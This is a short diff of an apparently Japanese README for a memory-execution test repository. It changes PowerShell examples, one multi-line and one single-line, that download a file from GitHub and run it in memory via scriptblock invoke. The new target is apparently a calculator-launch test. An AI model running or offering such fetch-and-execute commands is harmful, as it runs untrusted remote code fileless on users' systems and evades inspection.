@@ -1,5 +1,5 @@
 ```
-$c = (curl -URI https://raw.githubusercontent.com/kalaxity/memory_exec_test/main/test.txt).content
+$c = (curl -URI https://raw.githubusercontent.com/kalaxity/memory_exec_test/main/win_calc).content
 $s = [scriptblock]::create($c)
 $s.invoke()
 ```
@@ -7,7 +7,7 @@ $s.invoke()
 もしくはそれらをまとめて一行で
 
 ```
-([scriptblock]::create((curl -URI https://raw.githubusercontent.com/kalaxity/memory_exec_test/main/test.txt).content)).invoke()
+([scriptblock]::create((curl -URI https://raw.githubusercontent.com/kalaxity/memory_exec_test/main/win_calc).content)).invoke()
 ```
 
 ## ref.
